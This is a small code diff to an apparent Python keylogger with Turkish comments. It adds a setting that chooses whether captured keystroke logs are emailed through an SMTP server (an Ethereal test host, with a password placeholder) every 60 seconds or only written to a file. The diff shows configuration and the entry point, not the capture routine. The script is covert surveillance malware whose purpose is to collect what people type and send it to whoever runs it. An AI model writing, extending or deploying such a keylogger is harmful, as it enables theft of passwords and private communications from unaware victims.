@@ -9,7 +9,7 @@ MAIL_SIFRE = "MAIL SIFRENIZI GIRIN"
 MAIL_SMTP = "smtp.ethereal.email" #Ethereal Örnegidir
 SMTP_PORT = 587 # Ethereal Portudur
 RAPOR_SURE = 60 # loglarin mail ile atilma süresini düzenler
-
+RAPOR_TIPI = "mail" # "mail" veya sadece kayit icin "dosya" tercih edilebilir!
 
 class Keylogger:
     def __init__(self, sure, rapor):
@@ -93,5 +93,5 @@ class Keylogger:
         keyboard.wait()
 
 if __name__ == "__main__":
-    logger = Keylogger(sure=RAPOR_SURE, rapor="mail")
+    logger = Keylogger(sure=RAPOR_SURE, rapor=RAPOR_TIPI)
     logger.baslat()
